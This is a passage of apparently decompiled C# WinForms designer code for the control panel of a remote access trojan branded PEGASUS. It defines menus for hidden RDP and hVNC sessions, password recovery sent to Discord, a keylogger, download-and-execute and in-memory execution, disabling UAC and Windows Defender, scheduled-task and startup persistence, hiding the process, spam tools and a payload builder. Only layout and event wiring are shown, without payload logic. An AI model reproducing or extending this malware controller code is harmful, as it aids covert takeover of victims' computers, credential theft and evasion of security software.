			lv_country = new System.Windows.Forms.ColumnHeader();
			lv_group = new System.Windows.Forms.ColumnHeader();
			lv_hwid = new System.Windows.Forms.ColumnHeader();
			lv_user = new System.Windows.Forms.ColumnHeader();
			lv_camera = new System.Windows.Forms.ColumnHeader();
			lv_os = new System.Windows.Forms.ColumnHeader();
			lv_version = new System.Windows.Forms.ColumnHeader();
			lv_ins = new System.Windows.Forms.ColumnHeader();
			lv_admin = new System.Windows.Forms.ColumnHeader();
			lv_av = new System.Windows.Forms.ColumnHeader();
			lv_ping = new System.Windows.Forms.ColumnHeader();
			lv_act = new System.Windows.Forms.ColumnHeader();
			guna2ContextMenuStrip1 = new Guna.UI2.WinForms.Guna2ContextMenuStrip();
			tasksControlToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			onToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			offToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			toolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
			toolStripMenuItem2 = new System.Windows.Forms.ToolStripMenuItem();
			cmdToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			powershellToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			toolStripMenuItem3 = new System.Windows.Forms.ToolStripMenuItem();
			toolStripMenuItem4 = new System.Windows.Forms.ToolStripMenuItem();
			toolStripMenuItem5 = new System.Windows.Forms.ToolStripMenuItem();
			toolStripMenuItem6 = new System.Windows.Forms.ToolStripMenuItem();
			toolStripMenuItem81 = new System.Windows.Forms.ToolStripMenuItem();
			toolStripMenuItem7 = new System.Windows.Forms.ToolStripMenuItem();
			toolStripMenuItem8 = new System.Windows.Forms.ToolStripMenuItem();
			toolStripMenuItem9 = new System.Windows.Forms.ToolStripMenuItem();
			toolStripMenuItem10 = new System.Windows.Forms.ToolStripMenuItem();
			toolStripMenuItem11 = new System.Windows.Forms.ToolStripMenuItem();
			toolStripMenuItem12 = new System.Windows.Forms.ToolStripMenuItem();
			toolStripMenuItem76 = new System.Windows.Forms.ToolStripMenuItem();
			toolStripMenuItem77 = new System.Windows.Forms.ToolStripMenuItem();
			toolStripMenuItem79 = new System.Windows.Forms.ToolStripMenuItem();
			toolStripMenuItem13 = new System.Windows.Forms.ToolStripMenuItem();
			toolStripMenuItem71 = new System.Windows.Forms.ToolStripMenuItem();
			toolStripMenuItem72 = new System.Windows.Forms.ToolStripMenuItem();
			toolStripMenuItem73 = new System.Windows.Forms.ToolStripMenuItem();
			toolStripMenuItem74 = new System.Windows.Forms.ToolStripMenuItem();
			executeVBSToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			mergeRegToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			executebatToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			toolStripMenuItem75 = new System.Windows.Forms.ToolStripMenuItem();
			toolStripMenuItem78 = new System.Windows.Forms.ToolStripMenuItem();
			silentInstallerToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			toolStripMenuItem25 = new System.Windows.Forms.ToolStripMenuItem();
			toolStripMenuItem26 = new System.Windows.Forms.ToolStripMenuItem();
			toolStripMenuItem27 = new System.Windows.Forms.ToolStripMenuItem();
			toolStripMenuItem28 = new System.Windows.Forms.ToolStripMenuItem();
			toolStripMenuItem29 = new System.Windows.Forms.ToolStripMenuItem();
			toolStripMenuItem30 = new System.Windows.Forms.ToolStripMenuItem();
			toolStripMenuItem32 = new System.Windows.Forms.ToolStripMenuItem();
			toolStripMenuItem33 = new System.Windows.Forms.ToolStripMenuItem();
			toolStripMenuItem40 = new System.Windows.Forms.ToolStripMenuItem();
			toolStripMenuItem41 = new System.Windows.Forms.ToolStripMenuItem();
			toolStripMenuItem42 = new System.Windows.Forms.ToolStripMenuItem();
			toolStripMenuItem43 = new System.Windows.Forms.ToolStripMenuItem();
			toolStripMenuItem34 = new System.Windows.Forms.ToolStripMenuItem();
			toolStripMenuItem35 = new System.Windows.Forms.ToolStripMenuItem();
			toolStripMenuItem36 = new System.Windows.Forms.ToolStripMenuItem();
			toolStripMenuItem37 = new System.Windows.Forms.ToolStripMenuItem();
			toolStripMenuItem38 = new System.Windows.Forms.ToolStripMenuItem();
			toolStripMenuItem39 = new System.Windows.Forms.ToolStripMenuItem();
			hiddenRDPToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			HRDPconnectToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			copyProfileToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			HRDPcleanUnistallToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			connectToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			hVNChBrowsersToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			hVNCCToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			uploadsPluginToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			toolStripMenuItem84 = new System.Windows.Forms.ToolStripMenuItem();
			toolStripMenuItem85 = new System.Windows.Forms.ToolStripMenuItem();
			hVNCCToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
			hVNCCStartToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			stopToolStripMenuItem3 = new System.Windows.Forms.ToolStripMenuItem();
			toolStripMenuItem44 = new System.Windows.Forms.ToolStripMenuItem();
			toolStripMenuItem45 = new System.Windows.Forms.ToolStripMenuItem();
			toolStripMenuItem46 = new System.Windows.Forms.ToolStripMenuItem();
			toolStripMenuItem48 = new System.Windows.Forms.ToolStripMenuItem();
			toolStripMenuItem47 = new System.Windows.Forms.ToolStripMenuItem();
			toolStripMenuItem49 = new System.Windows.Forms.ToolStripMenuItem();
			toolStripMenuItem50 = new System.Windows.Forms.ToolStripMenuItem();
			toolStripMenuItem51 = new System.Windows.Forms.ToolStripMenuItem();
			addPEGASUSSheduleTaskToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			toolStripMenuItem52 = new System.Windows.Forms.ToolStripMenuItem();
			toolStripMenuItem53 = new System.Windows.Forms.ToolStripMenuItem();
			addPEGASUSToStartupToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			passwordRecoveryToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			toolStripMenuItem31 = new System.Windows.Forms.ToolStripMenuItem();
			sKYNETToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			recoverAllSendToDiscordToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			toolStripMenuItem80 = new System.Windows.Forms.ToolStripMenuItem();
			toolStripMenuItem54 = new System.Windows.Forms.ToolStripMenuItem();
			toolStripMenuItem55 = new System.Windows.Forms.ToolStripMenuItem();
			toolStripMenuItem56 = new System.Windows.Forms.ToolStripMenuItem();
			startToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
			stopToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
			hIDEPEGASUSPROCESSToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			toolStripMenuItem82 = new System.Windows.Forms.ToolStripMenuItem();
			toolStripMenuItem83 = new System.Windows.Forms.ToolStripMenuItem();
			watchDogToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			startToolStripMenuItem3 = new System.Windows.Forms.ToolStripMenuItem();
			stopToolStripMenuItem2 = new System.Windows.Forms.ToolStripMenuItem();
			taskMgrDogToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			startToolStripMenuItem4 = new System.Windows.Forms.ToolStripMenuItem();
			stopToolStripMenuItem4 = new System.Windows.Forms.ToolStripMenuItem();
			spamToolsToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			sendEmailFromClientPCToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			webHookSpammerToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			startToolStripMenuItem2 = new System.Windows.Forms.ToolStripMenuItem();
			stopToolStripMenuItem5 = new System.Windows.Forms.ToolStripMenuItem();
			chatSpammerToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			toolStripMenuItem57 = new System.Windows.Forms.ToolStripMenuItem();
			toolStripMenuItem60 = new System.Windows.Forms.ToolStripMenuItem();
			toolStripMenuItem59 = new System.Windows.Forms.ToolStripMenuItem();
			pEGASUSBUILDERToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			sKYNETSHOPToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			openSupportTicketToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			toolStripMenuItem58 = new System.Windows.Forms.ToolStripMenuItem();
			LISTVIEWSPANELSMALL2 = new Guna.UI2.WinForms.Guna2Panel();
			label5 = new System.Windows.Forms.Label();
			label6 = new System.Windows.Forms.Label();
			guna2Separator1 = new Guna.UI2.WinForms.Guna2Separator();
			label1 = new System.Windows.Forms.Label();
			pictureBox1 = new System.Windows.Forms.PictureBox();
			statusStrip1 = new System.Windows.Forms.StatusStrip();
			toolStripStatusLabel3 = new System.Windows.Forms.ToolStripStatusLabel();
			guna2PictureBox4 = new Guna.UI2.WinForms.Guna2PictureBox();
			guna2PictureBox3 = new Guna.UI2.WinForms.Guna2PictureBox();
			guna2PictureBox2 = new Guna.UI2.WinForms.Guna2PictureBox();
			guna2PictureBox1 = new Guna.UI2.WinForms.Guna2PictureBox();
			panel1 = new System.Windows.Forms.Panel();
			panel2 = new System.Windows.Forms.Panel();
			panel3 = new System.Windows.Forms.Panel();
			guna2Transition1 = new Guna.UI2.WinForms.Guna2Transition();
			guna2ShadowPanel1 = new Guna.UI2.WinForms.Guna2ShadowPanel();
			LISTVIEWPANEL0 = new Guna.UI2.WinForms.Guna2ShadowPanel();
			guna2Panel1 = new Guna.UI2.WinForms.Guna2Panel();
			guna2VSeparator2 = new Guna.UI2.WinForms.Guna2VSeparator();
			guna2VSeparator1 = new Guna.UI2.WinForms.Guna2VSeparator();
			guna2Panel2 = new Guna.UI2.WinForms.Guna2Panel();
			guna2NumericUpDown1 = new Guna.UI2.WinForms.Guna2NumericUpDown();
			guna2GradientButton1 = new Guna.UI2.WinForms.Guna2GradientButton();
			guna2GradientButton2 = new Guna.UI2.WinForms.Guna2GradientButton();
			guna2Shapes4 = new Guna.UI2.WinForms.Guna2Shapes();
			guna2Shapes3 = new Guna.UI2.WinForms.Guna2Shapes();
			guna2Shapes2 = new Guna.UI2.WinForms.Guna2Shapes();
			guna2Shapes1 = new Guna.UI2.WinForms.Guna2Shapes();
			guna2Shapes5 = new Guna.UI2.WinForms.Guna2Shapes();
			guna2Transition2 = new Guna.UI2.WinForms.Guna2Transition();
			guna2NotificationPaint1 = new Guna.UI2.WinForms.Guna2NotificationPaint(components);
			loadForm = new Guna.UI2.WinForms.Guna2Transition();
			guna2Transition3 = new Guna.UI2.WinForms.Guna2Transition();
			guna2HtmlToolTip1 = new Guna.UI2.WinForms.Guna2HtmlToolTip();
			contextMenuLogs.SuspendLayout();
			contextMenuThumbnail.SuspendLayout();
			((System.ComponentModel.ISupportInitialize)performanceCounter1).BeginInit();
			((System.ComponentModel.ISupportInitialize)performanceCounter2).BeginInit();
			tabControl1.SuspendLayout();
			guna2ContextMenuStrip2.SuspendLayout();
			LISTVIEWSPANEL1.SuspendLayout();
			((System.ComponentModel.ISupportInitialize)guna2PictureBox5).BeginInit();
			buttonspanel.SuspendLayout();
			((System.ComponentModel.ISupportInitialize)numPort).BeginInit();
			guna2ContextMenuStrip1.SuspendLayout();
			LISTVIEWSPANELSMALL2.SuspendLayout();
			((System.ComponentModel.ISupportInitialize)pictureBox1).BeginInit();
			statusStrip1.SuspendLayout();
			((System.ComponentModel.ISupportInitialize)guna2PictureBox4).BeginInit();
			((System.ComponentModel.ISupportInitialize)guna2PictureBox3).BeginInit();
			((System.ComponentModel.ISupportInitialize)guna2PictureBox2).BeginInit();
			((System.ComponentModel.ISupportInitialize)guna2PictureBox1).BeginInit();
			panel1.SuspendLayout();
			guna2ShadowPanel1.SuspendLayout();
			LISTVIEWPANEL0.SuspendLayout();
			guna2Panel1.SuspendLayout();
			guna2Panel2.SuspendLayout();
			((System.ComponentModel.ISupportInitialize)guna2NumericUpDown1).BeginInit();
			SuspendLayout();
			ping.Enabled = true;
			ping.Interval = 30000;
			ping.Tick += new System.EventHandler(ping_Tick);
			UpdateUI.Enabled = true;
			UpdateUI.Interval = 500;
			UpdateUI.Tick += new System.EventHandler(UpdateUI_Tick);
			guna2Transition3.SetDecoration(contextMenuLogs, Guna.UI2.AnimatorNS.DecorationType.None);
			loadForm.SetDecoration(contextMenuLogs, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2Transition2.SetDecoration(contextMenuLogs, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2Transition1.SetDecoration(contextMenuLogs, Guna.UI2.AnimatorNS.DecorationType.None);
			contextMenuLogs.ImageScalingSize = new System.Drawing.Size(24, 24);
			contextMenuLogs.Items.AddRange(new System.Windows.Forms.ToolStripItem[1] { cLEARToolStripMenuItem });
			contextMenuLogs.Name = "contextMenuLogs";
			contextMenuLogs.ShowImageMargin = false;
			contextMenuLogs.Size = new System.Drawing.Size(77, 26);
			cLEARToolStripMenuItem.Name = "cLEARToolStripMenuItem";
			cLEARToolStripMenuItem.Size = new System.Drawing.Size(76, 22);
			cLEARToolStripMenuItem.Text = "Clear";
			cLEARToolStripMenuItem.Click += new System.EventHandler(CLEARToolStripMenuItem_Click);
			guna2Transition3.SetDecoration(contextMenuThumbnail, Guna.UI2.AnimatorNS.DecorationType.None);
			loadForm.SetDecoration(contextMenuThumbnail, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2Transition2.SetDecoration(contextMenuThumbnail, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2Transition1.SetDecoration(contextMenuThumbnail, Guna.UI2.AnimatorNS.DecorationType.None);
			contextMenuThumbnail.ImageScalingSize = new System.Drawing.Size(24, 24);
			contextMenuThumbnail.Items.AddRange(new System.Windows.Forms.ToolStripItem[2] { sTARTToolStripMenuItem, sTOPToolStripMenuItem });
			contextMenuThumbnail.Name = "contextMenuStrip2";
			contextMenuThumbnail.Size = new System.Drawing.Size(99, 48);
			sTARTToolStripMenuItem.ForeColor = System.Drawing.SystemColors.ControlText;
			sTARTToolStripMenuItem.Name = "sTARTToolStripMenuItem";
			sTARTToolStripMenuItem.Size = new System.Drawing.Size(98, 22);
			sTARTToolStripMenuItem.Text = "Start";
			sTARTToolStripMenuItem.Click += new System.EventHandler(STARTToolStripMenuItem_Click);
			sTOPToolStripMenuItem.Name = "sTOPToolStripMenuItem";
			sTOPToolStripMenuItem.Size = new System.Drawing.Size(98, 22);
			sTOPToolStripMenuItem.Text = "Stop";
			sTOPToolStripMenuItem.Click += new System.EventHandler(STOPToolStripMenuItem_Click);
			ThumbnailImageList.ColorDepth = System.Windows.Forms.ColorDepth.Depth16Bit;
			ThumbnailImageList.ImageSize = new System.Drawing.Size(256, 256);
			ThumbnailImageList.TransparentColor = System.Drawing.Color.Transparent;
			performanceCounter1.CategoryName = "Processor";
			performanceCounter1.CounterName = "% Processor Time";
			performanceCounter1.InstanceName = "_Total";
			performanceCounter2.CategoryName = "Memory";
			performanceCounter2.CounterName = "% Committed Bytes In Use";
			notifyIcon1.BalloonTipText = "New client connected!";
			notifyIcon1.BalloonTipTitle = "PEGASUS";
			notifyIcon1.Icon = (System.Drawing.Icon)resources.GetObject("notifyIcon1.Icon");
			notifyIcon1.Text = "PEGASUS";
			notifyIcon1.Visible = true;
			TimerTask.Enabled = true;
			TimerTask.Interval = 5000;
			TimerTask.Tick += new System.EventHandler(TimerTask_Tick);
			tabControl1.Controls.Add(tabPage1);
			tabControl1.Controls.Add(tabPage3);
			tabControl1.Controls.Add(tabPage4);
			tabControl1.Controls.Add(tabPage2);
			loadForm.SetDecoration(tabControl1, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2Transition3.SetDecoration(tabControl1, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2Transition1.SetDecoration(tabControl1, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2Transition2.SetDecoration(tabControl1, Guna.UI2.AnimatorNS.DecorationType.None);
			tabControl1.Location = new System.Drawing.Point(42, 282);
			tabControl1.Margin = new System.Windows.Forms.Padding(2);
			tabControl1.Name = "tabControl1";
			tabControl1.SelectedIndex = 0;
			tabControl1.Size = new System.Drawing.Size(1175, 257);
			tabControl1.SizeMode = System.Windows.Forms.TabSizeMode.Fixed;
			tabControl1.TabIndex = 3;
			guna2Transition1.SetDecoration(tabPage1, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2Transition3.SetDecoration(tabPage1, Guna.UI2.AnimatorNS.DecorationType.None);
			loadForm.SetDecoration(tabPage1, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2Transition2.SetDecoration(tabPage1, Guna.UI2.AnimatorNS.DecorationType.None);
			tabPage1.Location = new System.Drawing.Point(4, 23);
			tabPage1.Margin = new System.Windows.Forms.Padding(2);
			tabPage1.Name = "tabPage1";
			tabPage1.Padding = new System.Windows.Forms.Padding(2);
			tabPage1.Size = new System.Drawing.Size(1167, 230);
			tabPage1.TabIndex = 0;
			tabPage1.Text = "Clients";
			guna2Transition1.SetDecoration(tabPage3, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2Transition3.SetDecoration(tabPage3, Guna.UI2.AnimatorNS.DecorationType.None);
			loadForm.SetDecoration(tabPage3, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2Transition2.SetDecoration(tabPage3, Guna.UI2.AnimatorNS.DecorationType.None);
			tabPage3.Location = new System.Drawing.Point(4, 23);
			tabPage3.Margin = new System.Windows.Forms.Padding(2);
			tabPage3.Name = "tabPage3";
			tabPage3.Size = new System.Drawing.Size(1167, 230);
			tabPage3.TabIndex = 2;
			tabPage3.Text = "Screens";
			tabPage3.UseVisualStyleBackColor = true;
			guna2Transition1.SetDecoration(tabPage4, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2Transition3.SetDecoration(tabPage4, Guna.UI2.AnimatorNS.DecorationType.None);
			loadForm.SetDecoration(tabPage4, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2Transition2.SetDecoration(tabPage4, Guna.UI2.AnimatorNS.DecorationType.None);
			tabPage4.Location = new System.Drawing.Point(4, 23);
			tabPage4.Margin = new System.Windows.Forms.Padding(2);
			tabPage4.Name = "tabPage4";
			tabPage4.Padding = new System.Windows.Forms.Padding(2);
			tabPage4.Size = new System.Drawing.Size(1167, 230);
			tabPage4.TabIndex = 3;
			tabPage4.Text = "Auto Task";
			tabPage4.UseVisualStyleBackColor = true;
			guna2Transition1.SetDecoration(tabPage2, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2Transition3.SetDecoration(tabPage2, Guna.UI2.AnimatorNS.DecorationType.None);
			loadForm.SetDecoration(tabPage2, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2Transition2.SetDecoration(tabPage2, Guna.UI2.AnimatorNS.DecorationType.None);
			tabPage2.Location = new System.Drawing.Point(4, 23);
			tabPage2.Name = "tabPage2";
			tabPage2.Padding = new System.Windows.Forms.Padding(3);
			tabPage2.Size = new System.Drawing.Size(1167, 230);
			tabPage2.TabIndex = 4;
			tabPage2.Text = "Logs";
			tabPage2.UseVisualStyleBackColor = true;
			listView3.ContextMenuStrip = contextMenuThumbnail;
			guna2Transition3.SetDecoration(listView3, Guna.UI2.AnimatorNS.DecorationType.None);
			loadForm.SetDecoration(listView3, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2Transition1.SetDecoration(listView3, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2Transition2.SetDecoration(listView3, Guna.UI2.AnimatorNS.DecorationType.None);
			listView3.HideSelection = false;
			listView3.LargeImageList = ThumbnailImageList;
			listView3.Location = new System.Drawing.Point(1237, 80);
			listView3.Margin = new System.Windows.Forms.Padding(2);
			listView3.Name = "listView3";
			listView3.ShowItemToolTips = true;
			listView3.Size = new System.Drawing.Size(17, 303);
			listView3.SmallImageList = ThumbnailImageList;
			listView3.TabIndex = 0;
			listView3.UseCompatibleStateImageBehavior = false;
			listView4.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			listView4.BorderStyle = System.Windows.Forms.BorderStyle.None;
			listView4.Columns.AddRange(new System.Windows.Forms.ColumnHeader[2] { columnHeader4, columnHeader5 });
			listView4.ContextMenuStrip = guna2ContextMenuStrip2;
			guna2Transition3.SetDecoration(listView4, Guna.UI2.AnimatorNS.DecorationType.None);
			loadForm.SetDecoration(listView4, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2Transition1.SetDecoration(listView4, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2Transition2.SetDecoration(listView4, Guna.UI2.AnimatorNS.DecorationType.None);
			listView4.Dock = System.Windows.Forms.DockStyle.Fill;
			listView4.ForeColor = System.Drawing.Color.LightGray;
			listView4.FullRowSelect = true;
			listView4.HideSelection = false;
			listView4.Location = new System.Drawing.Point(0, 0);
			listView4.Margin = new System.Windows.Forms.Padding(2);
			listView4.Name = "listView4";
			listView4.Size = new System.Drawing.Size(231, 848);
			listView4.TabIndex = 0;
			listView4.UseCompatibleStateImageBehavior = false;
			listView4.View = System.Windows.Forms.View.Details;
			columnHeader4.Text = "Task";
			columnHeader4.Width = 97;
			columnHeader5.Text = "Run times";
			columnHeader5.Width = 116;
			guna2ContextMenuStrip2.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			guna2Transition1.SetDecoration(guna2ContextMenuStrip2, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2Transition2.SetDecoration(guna2ContextMenuStrip2, Guna.UI2.AnimatorNS.DecorationType.None);
			loadForm.SetDecoration(guna2ContextMenuStrip2, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2Transition3.SetDecoration(guna2ContextMenuStrip2, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2ContextMenuStrip2.Font = new System.Drawing.Font("Electrolize", 8.999999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			guna2ContextMenuStrip2.ImageScalingSize = new System.Drawing.Size(29, 29);
			guna2ContextMenuStrip2.Items.AddRange(new System.Windows.Forms.ToolStripItem[10] { toolStripMenuItem61, toolStripMenuItem62, toolStripMenuItem63, toolStripMenuItem64, toolStripMenuItem65, toolStripMenuItem66, toolStripMenuItem67, toolStripMenuItem68, toolStripMenuItem69, toolStripMenuItem70 });
			guna2ContextMenuStrip2.Margin = new System.Windows.Forms.Padding(3);
			guna2ContextMenuStrip2.Name = "guna2ContextMenuStrip1";
			guna2ContextMenuStrip2.RenderStyle.ArrowColor = System.Drawing.Color.FromArgb(191, 37, 33);
			guna2ContextMenuStrip2.RenderStyle.BorderColor = System.Drawing.Color.FromArgb(30, 30, 30);
			guna2ContextMenuStrip2.RenderStyle.ColorTable = null;
			guna2ContextMenuStrip2.RenderStyle.RoundedEdges = true;
			guna2ContextMenuStrip2.RenderStyle.SelectionArrowColor = System.Drawing.Color.White;
			guna2ContextMenuStrip2.RenderStyle.SelectionBackColor = System.Drawing.Color.FromArgb(191, 37, 33);
			guna2ContextMenuStrip2.RenderStyle.SelectionForeColor = System.Drawing.Color.White;
			guna2ContextMenuStrip2.RenderStyle.SeparatorColor = System.Drawing.Color.Gainsboro;
			guna2ContextMenuStrip2.RenderStyle.TextRenderingHint = System.Drawing.Text.TextRenderingHint.SystemDefault;
			guna2ContextMenuStrip2.Size = new System.Drawing.Size(246, 364);
			toolStripMenuItem61.ForeColor = System.Drawing.Color.LightGray;
			toolStripMenuItem61.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem61.Image");
			toolStripMenuItem61.Name = "toolStripMenuItem61";
			toolStripMenuItem61.Size = new System.Drawing.Size(245, 36);
			toolStripMenuItem61.Text = "      Download & Execute";
			toolStripMenuItem61.Click += new System.EventHandler(sendFileFromUrlToolStripMenuItem_Click);
			toolStripMenuItem62.ForeColor = System.Drawing.Color.LightGray;
			toolStripMenuItem62.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem62.Image");
			toolStripMenuItem62.Name = "toolStripMenuItem62";
			toolStripMenuItem62.Size = new System.Drawing.Size(245, 36);
			toolStripMenuItem62.Text = "      Browse & Execute";
			toolStripMenuItem62.Click += new System.EventHandler(DownloadAndExecuteToolStripMenuItem_Click);
			toolStripMenuItem63.ForeColor = System.Drawing.Color.LightGray;
			toolStripMenuItem63.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem63.Image");
			toolStripMenuItem63.Name = "toolStripMenuItem63";
			toolStripMenuItem63.Size = new System.Drawing.Size(245, 36);
			toolStripMenuItem63.Text = "      Execute to Memory";
			toolStripMenuItem63.Click += new System.EventHandler(SENDFILETOMEMORYToolStripMenuItem1_Click);
			toolStripMenuItem64.ForeColor = System.Drawing.Color.LightGray;
			toolStripMenuItem64.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem64.Image");
			toolStripMenuItem64.Name = "toolStripMenuItem64";
			toolStripMenuItem64.Size = new System.Drawing.Size(245, 36);
			toolStripMenuItem64.Text = "      Persistence  Defeat UAC";
			toolStripMenuItem64.Visible = false;
			toolStripMenuItem64.Click += new System.EventHandler(disableUACToolStripMenuItem1_Click);
			toolStripMenuItem65.ForeColor = System.Drawing.Color.LightGray;
			toolStripMenuItem65.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem65.Image");
			toolStripMenuItem65.Name = "toolStripMenuItem65";
			toolStripMenuItem65.Size = new System.Drawing.Size(245, 36);
			toolStripMenuItem65.Text = "      Persistence  Defeat WD";
			toolStripMenuItem65.Visible = false;
			toolStripMenuItem65.Click += new System.EventHandler(disableWDToolStripMenuItem1_Click);
			toolStripMenuItem66.ForeColor = System.Drawing.Color.LightGray;
			toolStripMenuItem66.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem66.Image");
			toolStripMenuItem66.Name = "toolStripMenuItem66";
			toolStripMenuItem66.Size = new System.Drawing.Size(245, 36);
			toolStripMenuItem66.Text = "      Persistence Schtask";
			toolStripMenuItem66.Click += new System.EventHandler(installSchtaskToolStripMenuItem_Click);
			toolStripMenuItem67.ForeColor = System.Drawing.Color.LightGray;
			toolStripMenuItem67.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem67.Image");
			toolStripMenuItem67.Name = "toolStripMenuItem67";
			toolStripMenuItem67.Size = new System.Drawing.Size(245, 36);
			toolStripMenuItem67.Text = "      Update all clients";
			toolStripMenuItem67.Click += new System.EventHandler(UPDATEToolStripMenuItem1_Click);
			toolStripMenuItem68.ForeColor = System.Drawing.Color.LightGray;
			toolStripMenuItem68.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem68.Image");
			toolStripMenuItem68.Name = "toolStripMenuItem68";
			toolStripMenuItem68.Size = new System.Drawing.Size(245, 36);
			toolStripMenuItem68.Text = "      Task Keylogger";
			toolStripMenuItem68.Click += new System.EventHandler(toolStripMenuItem68_Click);
			toolStripMenuItem69.ForeColor = System.Drawing.Color.LightGray;
			toolStripMenuItem69.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem69.Image");
			toolStripMenuItem69.Name = "toolStripMenuItem69";
			toolStripMenuItem69.Size = new System.Drawing.Size(245, 36);
			toolStripMenuItem69.Text = "      Fake Binder";
			toolStripMenuItem69.Visible = false;
			toolStripMenuItem69.Click += new System.EventHandler(fakeBinderToolStripMenuItem_Click);
			toolStripMenuItem70.ForeColor = System.Drawing.Color.LightGray;
			toolStripMenuItem70.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem70.Image");
			toolStripMenuItem70.Name = "toolStripMenuItem70";
			toolStripMenuItem70.Size = new System.Drawing.Size(245, 36);
			toolStripMenuItem70.Text = "      Delete";
			toolStripMenuItem70.Click += new System.EventHandler(DELETETASKToolStripMenuItem_Click);
			listView2.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			listView2.BorderStyle = System.Windows.Forms.BorderStyle.None;
			listView2.Columns.AddRange(new System.Windows.Forms.ColumnHeader[2] { columnHeader1, columnHeader2 });
			listView2.ContextMenuStrip = contextMenuLogs;
			guna2Transition3.SetDecoration(listView2, Guna.UI2.AnimatorNS.DecorationType.None);
			loadForm.SetDecoration(listView2, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2Transition1.SetDecoration(listView2, Guna.UI2.AnimatorNS.DecorationType.None);
			guna2Transition2.SetDecoration(listView2, Guna.UI2.AnimatorNS.DecorationType.None);
			listView2.FullRowSelect = true;
			listView2.HideSelection = false;
			listView2.Location = new System.Drawing.Point(1218, 4);
			listView2.Margin = new System.Windows.Forms.Padding(2);
			listView2.Name = "listView2";
			listView2.ShowGroups = false;
			listView2.ShowItemToolTips = true;
			listView2.Size = new System.Drawing.Size(22, 600);
			listView2.TabIndex = 2;
			listView2.UseCompatibleStateImageBehavior = false;
			listView2.View = System.Windows.Forms.View.Details;
			columnHeader1.Text = "Time";
			columnHeader1.Width = 128;
			columnHeader2.Text = "Logs";
			columnHeader2.Width = 105;
			toolStripMenuItem14.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			toolStripMenuItem14.ForeColor = System.Drawing.Color.LightGray;
			toolStripMenuItem14.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem14.Image");
			toolStripMenuItem14.Name = "toolStripMenuItem14";
			toolStripMenuItem14.Size = new System.Drawing.Size(204, 36);
			toolStripMenuItem14.Text = "     Send File";
			toolStripMenuItem15.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			toolStripMenuItem15.ForeColor = System.Drawing.Color.LightGray;
